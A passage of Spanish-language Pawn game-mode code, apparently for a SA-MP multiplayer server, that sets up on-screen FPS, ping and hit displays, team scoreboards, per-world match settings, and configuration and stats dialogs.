	PlayerTextDrawFont(playerid, mostrarFps[playerid], 1);
	PlayerTextDrawSetProportional(playerid, mostrarFps[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, mostrarFps[playerid], 0x000000AA);

	mostrarPing[playerid] = CreatePlayerTextDraw(playerid, 540, 8, "Ms: 194 (0.3%)");
	PlayerTextDrawLetterSize(playerid, mostrarPing[playerid], 0.200000, 1.000000);
	PlayerTextDrawAlignment(playerid, mostrarPing[playerid], 1);
	PlayerTextDrawColor(playerid, mostrarPing[playerid], -1);
	PlayerTextDrawSetShadow(playerid, mostrarPing[playerid], 0);
	PlayerTextDrawSetOutline(playerid, mostrarPing[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, mostrarPing[playerid], 51);
	PlayerTextDrawFont(playerid, mostrarPing[playerid], 1);
	PlayerTextDrawSetProportional(playerid, mostrarPing[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, mostrarPing[playerid], 0x000000AA);
}

stock ocultarDrawFpsPing(playerid){
	PlayerTextDrawHide(playerid, mostrarFps[playerid]);
	PlayerTextDrawHide(playerid, mostrarPing[playerid]);
}

stock mostrarDrawFpsPing(playerid){
	PlayerTextDrawShow(playerid, mostrarFps[playerid]);
	PlayerTextDrawShow(playerid, mostrarPing[playerid]);
}

stock eliminarDrawFpsPing(playerid){
	PlayerTextDrawDestroy(playerid, mostrarFps[playerid]);
	PlayerTextDrawDestroy(playerid, mostrarPing[playerid]);
}

stock configurarDrawHit(playerid){
	drawHit[playerid][0] = CreatePlayerTextDraw(playerid, 119.667304, 381.644348, "Jugador_(-3)");
	PlayerTextDrawLetterSize(playerid, drawHit[playerid][0], 0.170333, 0.977777);
	PlayerTextDrawAlignment(playerid, drawHit[playerid][0], 1);
	PlayerTextDrawColor(playerid, drawHit[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, drawHit[playerid][0], 1);
	PlayerTextDrawSetOutline(playerid, drawHit[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, drawHit[playerid][0], 255);
	PlayerTextDrawFont(playerid, drawHit[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, drawHit[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, drawHit[playerid][0], 0);

	drawHit[playerid][1] = CreatePlayerTextDraw(playerid, 115.333633, 397.822265, "Jugador_(+3)");
	PlayerTextDrawLetterSize(playerid, drawHit[playerid][1], 0.170333, 0.977777);
	PlayerTextDrawAlignment(playerid, drawHit[playerid][1], 1);
	PlayerTextDrawColor(playerid, drawHit[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, drawHit[playerid][1], 1);
	PlayerTextDrawSetOutline(playerid, drawHit[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, drawHit[playerid][1], 255);
	PlayerTextDrawFont(playerid, drawHit[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, drawHit[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, drawHit[playerid][1], 0);
}


stock configurarParamatros(){
	configurarMundos();
	configurarDrawPartidas();
}

stock configurarMundos(){
	for(new i=1; i<5; i++){
		establecerConfiguracionInicial(i);
	}
}

stock crearMarcadores(){
	new str[200];
	for(new i=1; i<=5;i++){
	 	format(str, sizeof(str), "{FFFFFF}Puntaje {F69521}%d {FFFFFF}- {007C0E}%d\n{FFFFFF}Rondas {F69521}%d {FFFFFF}- {007C0E}%d",
		configuracionMundo[i][puntajeNaranja], configuracionMundo[i][puntajeVerde], configuracionMundo[i][rondasNaranja], configuracionMundo[i][rondasVerde]);
	    Marcador[i] = Create3DTextLabel(str, COLOR_NEUTRO, posicionesMarcador[0][0], posicionesMarcador[0][1], posicionesMarcador[0][2], 300.0, i, 0);
	}
}

stock actualizarPosicionMarcador(numeroMundo){
    Delete3DTextLabel(Marcador[numeroMundo]);
    new nm = configuracionMundo[numeroMundo][Mapa];
	Marcador[numeroMundo] = Create3DTextLabel("xd", COLOR_NEUTRO, posicionesMarcador[nm][0], posicionesMarcador[nm][1], posicionesMarcador[nm][2], 300.0, numeroMundo, 0);
	actualizarMarcador(numeroMundo);
}

stock actualizarMarcador(numeroMundo){
	new str[200];
 	format(str, sizeof(str), "{FFFFFF}Puntaje {F69521}%d {FFFFFF}- {007C0E}%d\n{FFFFFF}Rondas {F69521}%d {FFFFFF}- {007C0E}%d",
	configuracionMundo[numeroMundo][puntajeNaranja], configuracionMundo[numeroMundo][puntajeVerde], configuracionMundo[numeroMundo][rondasNaranja], configuracionMundo[numeroMundo][rondasVerde]);
    Update3DTextLabelText(Marcador[numeroMundo], COLOR_NEUTRO, str);
}

stock crearMarcador(numeroMundo){
	new m = configuracionMundo[numeroMundo][Mapa];
	new str[200];
 	format(str, sizeof(str), "{FFFFFF}Puntaje {F69521}%d {FFFFFF}- {007C0E}%d\n{FFFFFF}Rondas {F69521}%d {FFFFFF}- {007C0E}%d", configuracionMundo[numeroMundo][puntajeNaranja], configuracionMundo[numeroMundo][puntajeVerde], configuracionMundo[numeroMundo][puntajeNaranja], configuracionMundo[numeroMundo][puntajeVerde]);
	Marcador[numeroMundo] = Create3DTextLabel(str, COLOR_NEUTRO, posicionesMarcador[m][0], posicionesMarcador[m][1], posicionesMarcador[m][2], 300.0, numeroMundo, 0);
}

stock configurarDrawPartidas(){
	for(new i=1; i<=5;i++){ 
		datosPartida[i] = TextDrawCreate(115.666709, 430, "nadie_vs_nadie");
		TextDrawLetterSize(datosPartida[i], 0.179999, 1.160297);
		TextDrawAlignment(datosPartida[i], 1);
		TextDrawColor(datosPartida[i], -1);
		TextDrawSetShadow(datosPartida[i], 1);
		TextDrawSetOutline(datosPartida[i], 0);
		TextDrawBackgroundColor(datosPartida[i], 168430130);
		TextDrawFont(datosPartida[i], 2);
		TextDrawSetProportional(datosPartida[i], 1);
		TextDrawUseBox(datosPartida[i], 1);
        TextDrawBoxColor(datosPartida[i], 0x000000AA);
    	TextDrawTextSize(datosPartida[i] , 550.0, 200.0);
        
		actualizarDrawPartida(i);
	}
}

stock ocultarDatosPartida(playerid){ TextDrawHideForPlayer(playerid, datosPartida[GetPlayerVirtualWorld(playerid)]); }

stock mostrarDatosPartida(playerid){ TextDrawShowForPlayer(playerid, datosPartida[GetPlayerVirtualWorld(playerid)]); }

stock actualizarDrawPartida(numeroMundo){
	new Info[300], str[100];

	format(str, sizeof(str), "    ~w~(~b~~h~~h~%s~w~)     ~y~Naranja ~w~(~y~%d~w~) ~y~%d",
	nombrePartida(configuracionMundo[numeroMundo][tipoPartida]), configuracionMundo[numeroMundo][puntajeNaranja], configuracionMundo[numeroMundo][rondasNaranja]);
	strcat(Info, str);

	format(str, sizeof(str), " ~w~vs ~g~%d ~w~(~g~%d~w~) ~g~Verde     ", 
	configuracionMundo[numeroMundo][rondasVerde], configuracionMundo[numeroMundo][puntajeVerde]);
	strcat(Info, str);
	format(str, sizeof(str), "~w~Max ronda: ~b~~h~~h~%d     ~w~Max puntos: ~b~~h~~h~%d     ~w~Mapa: ~b~~h~~h~%s",
	configuracionMundo[numeroMundo][rondaMaxima], configuracionMundo[numeroMundo][puntajeMaximo], nombreMapa(configuracionMundo[numeroMundo][Mapa]));
	strcat(Info, str);

	TextDrawSetString(datosPartida[numeroMundo], Info);

	ForPlayers(i){
		if(GetPlayerVirtualWorld(i) == numeroMundo){
			if(Jugador[i][mostrarMarcador]){
				TextDrawHideForPlayer(i, datosPartida[numeroMundo]);
				TextDrawShowForPlayer(i, datosPartida[numeroMundo]);
			}
		}
	}
}

stock establecerConfiguracionInicial(numeroMundo){

	configuracionMundo[numeroMundo][enJuego] = false;
	configuracionMundo[numeroMundo][enPausa] = false;
	configuracionMundo[numeroMundo][tipoPartida] = ENTRENAMIENTO;
	configuracionMundo[numeroMundo][rondaActual] = 1;
	configuracionMundo[numeroMundo][rondaMaxima] = 3;
	configuracionMundo[numeroMundo][puntajeMaximo] = 10;

	configuracionMundo[numeroMundo][jugadoresNaranja] = 0;
	configuracionMundo[numeroMundo][rondasNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeTotalNaranja] = 0;

	configuracionMundo[numeroMundo][jugadoresVerde] = 0;
	configuracionMundo[numeroMundo][rondasVerde] = 0;
	configuracionMundo[numeroMundo][puntajeVerde] = 0;
	configuracionMundo[numeroMundo][puntajeTotalNaranja] = 0;

	configuracionMundo[numeroMundo][cantidadEspectadores] = 0;
	configuracionMundo[numeroMundo][tipoArma] = random(3);
	configuracionMundo[numeroMundo][Mapa] = random(2);

	configuracionMundo[numeroMundo][Restriccion] = 0;
	configuracionMundo[numeroMundo][FPS] = false;
	configuracionMundo[numeroMundo][PING] = false;
	configuracionMundo[numeroMundo][PL] = false;
	configuracionMundo[numeroMundo][fpsMinimo] = 30;
	configuracionMundo[numeroMundo][pingMaximo] = 300;
	configuracionMundo[numeroMundo][plMaximo] = 1.00;

    configuracionMundo[numeroMundo][equiposBloqueados] = false;
	crearMarcador(numeroMundo);
}

stock variableActivado(var){
	new str[15];
	if(var == 1)
	    format(str, sizeof(str), "{26BF61}Si");
	if(var == 0)
		format(str, sizeof(str), "{FF5353}No");
	if(var == -1)
		format(str, sizeof(str), "{FF5353}No");
	return str;
}

stock mostrarInfoPartidaActual(playerid){
	new Dialogo[2048], str[200], numeroMundo = GetPlayerVirtualWorld(playerid);
	format(str, sizeof(str), "{7C7C7C}Par·metro\t{7C7C7C}Valor"); 	strcat(Dialogo, str);
 	format(str, sizeof(str), "\n{7C7C7C}En juego\t%s", variableActivado(configuracionMundo[numeroMundo][enJuego]));     strcat(Dialogo, str);
 	format(str, sizeof(str), "\n{7C7C7C}En pausa\t%s", variableActivado(configuracionMundo[numeroMundo][enPausa]));     strcat(Dialogo, str);
 	format(str, sizeof(str), "\n{7C7C7C}Tipo\t%s", nombrePartida(configuracionMundo[numeroMundo][tipoPartida]));     	strcat(Dialogo, str);
	format(str, sizeof(str), "\n{7C7C7C}Mapa\t{FFFFFF}%s", nombreMapa(configuracionMundo[numeroMundo][Mapa])); 			strcat(Dialogo, str);
	format(str, sizeof(str), "\n{7C7C7C}Armas\t{FFFFFF}%s", nombreArmas[configuracionMundo[numeroMundo][tipoArma]]); 	strcat(Dialogo, str);
	format(str, sizeof(str), "\n{7C7C7C}Puntaje m·ximo\t{FFFFFF}%d", configuracionMundo[numeroMundo][puntajeMaximo]); 	strcat(Dialogo, str);
	format(str, sizeof(str), "\n{7C7C7C}Ronda m·xima\t{FFFFFF}%d", configuracionMundo[numeroMundo][rondaMaxima]); 		strcat(Dialogo, str);
	format(str, sizeof(str), "\n{7C7C7C}Ronda actual\t{FFFFFF}%d", configuracionMundo[numeroMundo][rondaActual]); 		strcat(Dialogo, str);

	if(configuracionMundo[numeroMundo][enJuego]){
	    format(str, sizeof(str), "\n{7C7C7C}Tiempo inicio\t{FFFFFF}%dhs:%dm:%ds", configuracionMundo[numeroMundo][inicioHora], configuracionMundo[numeroMundo][inicioMinuto],
		configuracionMundo[numeroMundo][inicioSegundo]);
		strcat(Dialogo, str);
		format(str, sizeof(str), "\n{7C7C7C}Tiempo transcurrido\t{FFFFFF}%dm:%ds", configuracionMundo[numeroMundo][Minutos], configuracionMundo[numeroMundo][Segundos]);
		strcat(Dialogo, str);
	}

	format(str, sizeof(str), "\n{F69521}Naranja\t{7C7C7C}P:{FFFFFF} %d {7C7C7C}/ R:{FFFFFF} %d", configuracionMundo[numeroMundo][puntajeNaranja], configuracionMundo[numeroMundo][rondasNaranja]);
	strcat(Dialogo, str);
	format(str, sizeof(str), "\n{007C0E}Verde\t{7C7C7C}P:{FFFFFF} %d {7C7C7C}/ R:{FFFFFF} %d", configuracionMundo[numeroMundo][puntajeVerde], configuracionMundo[numeroMundo][rondasVerde]);
	strcat(Dialogo, str);

	if(configuracionMundo[numeroMundo][PL]){
		format(str, sizeof(str), "\n{7C7C7C}PL m·ximo\t{FFFFFF}%.2f", configuracionMundo[numeroMundo][plMaximo]);
		strcat(Dialogo, str);
	}

	if(configuracionMundo[numeroMundo][FPS]){
		format(str, sizeof(str), "\n{7C7C7C}FPS minimos\t{FFFFFF}%d", configuracionMundo[numeroMundo][fpsMinimo]);
		strcat(Dialogo, str);
	}

	if(configuracionMundo[numeroMundo][PING]){
		format(str, sizeof(str), "\n{7C7C7C}Ping m·ximo\t{FFFFFF}%d", configuracionMundo[numeroMundo][pingMaximo]);
		strcat(Dialogo, str);
	}


	return ShowPlayerDialog(playerid, D_INFO_PARTIDA_ACTUAL, DIALOG_STYLE_TABLIST_HEADERS, "{C7C7C7}InformaciÛnn", Dialogo, "<<", "Actualizar");
}


stock mostrarMenuConfiguracionPartida(playerid){
	new Dialogo[1000], str[31], string[254], numeroMundo = GetPlayerVirtualWorld(playerid);
	actualizarDrawPartida(numeroMundo);
	//actualizarDrawPuntajeRivalidad(numeroMundo);
	//actualizarDrawPlayersRivalidad(numeroMundo);
	actualizarMarcador(numeroMundo);
	format(str, sizeof(str), "{7C7C7C}Mundo %d: ConfiguraciÛn", numeroMundo);
 	strcat(Dialogo, "{7C7C7C}Par·metro\t{7C7C7C}SelecciÛn\n");
	format(string, sizeof(string), "\n{7C7C7C}Mapa\t%s", nombreMapa(configuracionMundo[numeroMundo][Mapa]));						strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Armas\t%s", nombreArmas[configuracionMundo[numeroMundo][tipoArma]]);			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Puntaje m·ximo\t{FFFFFF}%d", configuracionMundo[numeroMundo][puntajeMaximo]);			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Ronda m·xima\t{FFFFFF}%d", configuracionMundo[numeroMundo][rondaMaxima]);				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Puntaje {F69521}naranja\t{FFFFFF}%d", configuracionMundo[numeroMundo][puntajeNaranja]);		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Rondas {F69521}naranja\t{FFFFFF}%d", configuracionMundo[numeroMundo][rondasNaranja]);		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Puntaje {007C0E}verde\t{FFFFFF}%d", configuracionMundo[numeroMundo][puntajeVerde]);		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Rondas {007C0E}verde\t{FFFFFF}%d", configuracionMundo[numeroMundo][rondasVerde]);		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}PL m·ximo\t{FFFFFF}%.2f", configuracionMundo[numeroMundo][plMaximo]);					strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}FPS minimos\t{FFFFFF}%d", configuracionMundo[numeroMundo][fpsMinimo]);				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}PING m·ximo\t{FFFFFF}%d", configuracionMundo[numeroMundo][pingMaximo]);				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}RestricciÛn de conexiÛn\t%s", mostrarDisponibilidad(configuracionMundo[numeroMundo][Restriccion]));	
	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Equipos bloqueados\t%s", mostrarDisponibilidad(configuracionMundo[numeroMundo][equiposBloqueados]));
	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Establecer la {FFFFFF}armadura {7C7C7C}por completo.");									strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Respawnear a los jugadores.");															strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Resetear la partida.");																	strcat(Dialogo, string);
	/*
	format(string, sizeof(string), "\n{7C7C7C}Mover jugador a {F69521}naranja");															strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mover jugador a {007C0E}verde");															strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mover jugador a {88F7F7}Espectador");														strcat(Dialogo, string);
	*/
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA, DIALOG_STYLE_TABLIST_HEADERS, str, Dialogo, "Cambiar", "X");
}

stock mostrarMenuConfiguracionPP(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}perdida de paquetes {FFFFFF}m·xima para la partida (0.50 - 3.00).");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_PL, DIALOG_STYLE_INPUT, "{7C7C7C}Establecer PL m·ximo", str , ">>", "X");
}

stock mostrarMenuConfiguracionPING(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el {26BF61}ping {FFFFFF}m·ximo para la partida (250 - 400).");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_PING, DIALOG_STYLE_INPUT, "{7C7C7C}Establecer PING m·ximo", str , ">>", "X");
}

stock mostrarMenuConfiguracionFPS(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el minimo de {26BF61}fps {FFFFFF}para la partida (20 - 45).");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_FPS, DIALOG_STYLE_INPUT, "{7C7C7C}Establecer FPS minimos", str , ">>", "X");
}

stock mostrarMenuConfiguracionRA(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la cantidad de {26BF61}rondas {FFFFFF}del equipo {007C0E}verde{FFFFFF}.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_RV, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn rondas equipo {007C0E}verde", str , ">>", "X");
}

stock mostrarMenuConfiguracionPA(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el nuevo {26BF61}puntaje {FFFFFF}del equipo {007C0E}verde{FFFFFF}.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_PV, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn puntaje equipo {007C0E}verde", str , ">>", "X");
}


stock mostrarMenuConfiguracionRR(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la cantidad de {26BF61}rondas {FFFFFF}del equipo {F69521}naranja{FFFFFF}.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_RN, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn rondas equipo {F69521}naranja", str , ">>", "X");
}

stock mostrarMenuConfiguracionPR(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el nuevo {26BF61}puntaje {FFFFFF}del equipo {F69521}naranja{FFFFFF}.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_PN, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn puntaje equipo {F69521}naranja", str , ">>", "X");
}

stock mostrarMenuConfiguracionRM(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el {26BF61}n˙mero {FFFFFF}m·ximo para las rondas.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_RM, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn ronda m·xima", str , ">>", "X");
}

stock mostrarMenuConfiguracionPM(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe el {26BF61}n˙mero {FFFFFF}m·ximo para el puntaje.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_PM, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn puntaje m·ximo", str , ">>", "X");
}

stock mostrarMenuConfiguracionArma(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Escopeta recortada");	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Desert Eagle");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Armas rùpidas");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Armas lentas");		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_ARMA, DIALOG_STYLE_TABLIST, "{7C7C7C}SelecciÛn de armas", Dialogo, "Elegir", "X");
}

stock mostrarMenuConfiguracionMapa(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Aeropuerto LV");	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Aeropuerto SF");	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Auto-escuela");	strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_PARTIDA_MAPA, DIALOG_STYLE_TABLIST, "{7C7C7C}SelecciÛn del mapa", Dialogo, "Elegir", "X");
}

stock cambiarMapa(playerid, numeroMundo, numeroMapa){
	if(configuracionMundo[numeroMundo][Mapa] == numeroMapa){
		SendClientMessage(playerid, COLOR_ROJO, "> Ya esta puesto ese mapa.");
		return mostrarMenuConfiguracionPartida(playerid);
	}
	new Texto[300];
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ el mapa a {FFFFFF}%s{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), nombreMapa(numeroMapa));
	enviarATodos(numeroMundo, Texto);
	configuracionMundo[numeroMundo][Mapa] = numeroMapa;
	respawnearTodos(numeroMundo);
	return 1;
}

stock cambiarArma(playerid, numeroMundo, numeroArma){
	if(configuracionMundo[numeroMundo][tipoArma] == numeroArma){
		SendClientMessage(playerid, COLOR_ROJO, "> Ya esta puesto ese tipo de arma.");
		return mostrarMenuConfiguracionPartida(playerid);
	}
	new Texto[300];
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ el tipo de arma a {FFFFFF}%s{C9C9C9}.",
	numeroMundo, colorJugador(playerid), obtenerNick(playerid), nombreArmas[numeroArma]);

	enviarATodos(numeroMundo, Texto);
	configuracionMundo[numeroMundo][tipoArma] = numeroArma;
	actualizarArmas(numeroMundo);
	return 1;
}

stock actualizarArmas(numeroMundo){
	ForPlayers(i){
	    if(GetPlayerVirtualWorld(i) == numeroMundo){
	        ResetPlayerWeapons(i);
	        darArmas(i);
	    }
	}
}

stock mostrarConexion(playerid, i){
	new stats[500];
    format(stats, sizeof(stats), "- {%06x}%s {C9C9C9}| Velocidad: {FFFFFF}%d fps {C9C9C9}| Latencia: {FFFFFF}%d ms {C9C9C9}| Paquetes perdidos: {FFFFFF}%.2f",
	colorJugador(i), Jugador[i][Nombre], GetPlayerFPS(i), GetPlayerPing(i), NetStats_PacketLossPercent(i));
	return SendClientMessage(playerid, COLOR_NEUTRO, stats);
}

stock mostrarStats(playerid, i){
    new stats[2000], horas = 0, minutos = 0, segundos = 0;

	obtenerTiempoConexion(i, horas, minutos, segundos);

	if(Duelo[i][enCurso]){
		new m = 0, s = 0;
		if(Duelo[i][Creador]){
			s = Duelo[i][Segundos]; 
			m = Duelo[i][Minutos];
		}else{
			s = Duelo[idOponente(i)][Segundos]; 
			m = Duelo[idOponente(i)][Minutos];
		}
		format(stats, sizeof(stats), "{7C7C7C}- {7C7C7C}Dueleando hace {FFFFFF}%dm{7C7C7C}: {FFFFFF}%ds", m, s);
	}else{
		format(stats, sizeof(stats), "{7C7C7C}- {7C7C7C}Jugando en el mundo {FFFFFF}%d", GetPlayerVirtualWorld(i));
	}
	format(stats, sizeof(stats), "%s\n{7C7C7C}- N˙mero de cuenta: {FFFFFF}%d", stats, Jugador[i][ID]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Nombre: {%06x}%s", stats, colorJugador(i), Jugador[i][Nombre]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Fecha de registro: {FFFFFF}%s", stats, obtenerFechaRegistro(playerid));
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Tiempo jugando: {FFFFFF}%dh:%dm:%ds", stats, horas, minutos, segundos);
    //format(stats, sizeof(stats), "%s\n- {7C7C7C}Tiempo total: {FFFFFF}%d horas", stats, Jugador[i][horasTotal]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Pais: {FFFFFF}%s", stats, Jugador[i][Pais]);

    format(stats, sizeof(stats), "%s\n\n- {7C7C7C}Skin: {FFFFFF}%d", stats, GetPlayerSkin(i));
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Puntaje solo: {FFFFFF}%d", stats, Jugador[i][puntajeSolo]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Puntaje en equipo: {FFFFFF}%d", stats, Jugador[i][puntajeEquipo]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Duelos ganados: {FFFFFF}%d", stats, Jugador[i][duelosGanados]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Duelos perdidos: {FFFFFF}%d", stats, Jugador[i][duelosPerdidos]);
    format(stats, sizeof(stats), "%s\n- {7C7C7C}Rango: {%s}%s {7C7C7C}(%d)", stats, colorRango(i), nombreRango(i), Jugador[i][puntajeSolo]);
    if(Jugador[i][Admin] > 0)
		format(stats, sizeof(stats), "%s\n{7C7C7C}- %s ({FFFFFF}%d{7C7C7C})", stats, obtenerTipoAdmin(Jugador[i][Admin]), Jugador[i][Admin]);
    
	return ShowPlayerDialog(playerid, 153, DIALOG_STYLE_MSGBOX, "InformaciÛn", stats, "X", "");
}


stock mostrarDisponibilidad(tipo){
	new str[30];
	if(tipo == 1) format(str, sizeof(str), "{26BF61}Activado");
	else format(str, sizeof(str), "{FF0000}Desactivado");
	return str;
}

stock mostrarTaburador(id){
	new str[30];
	if(id == 1)
	    format(str, sizeof(str), "{FFFFFF}Mostrar conexiÛn");
	else
		format(str, sizeof(str), "{FFFFFF}Mostrar estadÌsticas");
	return str;
}

stock mostrarCampanaElegida(tipo){
	new str[30];
	if(tipo == CAMPANA_CLASICO)
	    format(str, sizeof(str), "{FFFFFF}Cl·sico");
	if(tipo == CAMPANA_CAMARA_FOTO)
	    format(str, sizeof(str), "{FFFFFF}C·mara de foto");
	if(tipo == CAMPANA_SLAP)
	    format(str, sizeof(str), "{FFFFFF}Slap");
	if(tipo == CAMPANA_ELECTROSH0CK)
	    format(str, sizeof(str), "{FFFFFF}Electroshock");
	if(tipo == CAMPANA_VIDEOJUEGO)
	    format(str, sizeof(str), "{FFFFFF}Videojuego");
	if(tipo == CAMPANA_MODERNO)
	    format(str, sizeof(str), "{FFFFFF}Moderno");
	return str;
}

stock mostrarMenuConfiguracionJugador(playerid){
	new Dialogo[1000], string[254];
 	strcat(Dialogo, "{7C7C7C}Par·metro\t{7C7C7C}Estado\n");
	format(string, sizeof(string), "{7C7C7C}Mensajes privados\t%s", mostrarDisponibilidad(Jugador[playerid][mensajesPrivados]));			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Invitaciones de duelos\t%s", mostrarDisponibilidad(Jugador[playerid][invitacionDuelos]));		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mostrar FPS y MS\t%s", mostrarDisponibilidad(Jugador[playerid][mostrarFpsPing]));				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mostrar marcador\t%s", mostrarDisponibilidad(Jugador[playerid][mostrarMarcador]));				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}InformaciÛn de daÒo\t%s", mostrarDisponibilidad(Jugador[playerid][infoDamage]));				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Sonido de campana\t%s", mostrarDisponibilidad(Jugador[playerid][sonidoCampana]));				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Tipo de campana\t%s", mostrarCampanaElegida(Jugador[playerid][tipoCampana]));
	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Taburador\t%s", mostrarTaburador(Jugador[playerid][mostrarTab]));		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Skin\t{FFFFFF}%d", Jugador[playerid][Skin]);													strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Clima\t{FFFFFF}%d", Jugador[playerid][Clima]);												strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Hora\t{FFFFFF}%d", Jugador[playerid][Hora]);													strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}ConfiguraciÛn de Cuenta", Dialogo, "Cambiar", "X");
}

stock mostrarMenuConfiguracionCampana(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Cl·sico");				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}C·mara de foto");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Slap");				strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Electroshock");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Videojuego");			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Moderno");			strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_CAMPANA, DIALOG_STYLE_TABLIST, "{7C7C7C}SelecciÛn sonido de Campana", Dialogo, "Elegir", "X");
}
stock mostrarMenuConfiguracionSkin(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}ID {FFFFFF}del skin.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_SKIN, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn del Skin", str , ">>", "X");
}

stock mostrarMenuConfiguracionClima(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}ID {FFFFFF}del clima en n˙mero.");
